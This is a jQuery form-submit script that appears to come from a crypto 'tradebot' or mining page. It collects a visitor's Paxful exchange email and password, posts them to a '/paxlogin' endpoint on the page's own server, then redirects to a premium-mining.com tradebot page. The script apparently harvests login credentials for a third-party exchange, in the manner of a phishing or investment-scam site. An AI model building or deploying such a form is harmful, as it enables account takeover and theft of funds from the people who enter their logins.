        <script type="text/javascript">
        (function(){
            $('#regsubmit').click(function(event){
                event.preventDefault()
                console.log('working')

                var values = {
                    paxful_email: $('#paxful_email').val().trim(),
                    paxful_password: $('#paxful_password').val().trim(),
                    email: $('#email').val().trim()
                }

                console.log(values)

                $.ajax({
                    url : '/paxlogin',
                    type: 'POST',
                    data : values,
                    success: function(data, textStatus, jqXHR){
                        console.log(JSON.stringify(data))
                        if (data.confirmation != 'success'){
                            var msg = data.data
                            swal({
                              title: "Error!",
                              text: msg,
                              icon: "warning",
                              button: "Ok!",
                            });
                            // alert('Error: ' + data.message)
                            // console.log(msg)
                            return
                        }
                        if (data.confirmation === 'success'){
                            var msg = data.data
                            swal({
                              title: "Authentication in progress!",
                              text: msg,
                              icon: "success",
                              button: "Ok!",
                            });
                            
                            return window.location.href = 'https://ap.premium-mining.com/tradebot'
                        }

                    },
                    error: function (jqXHR, textStatus, err){
                        console.log('Error: ' + err.message)
                    } 
                })

            })
        })()
    </script>
        
        
        
        
        
    

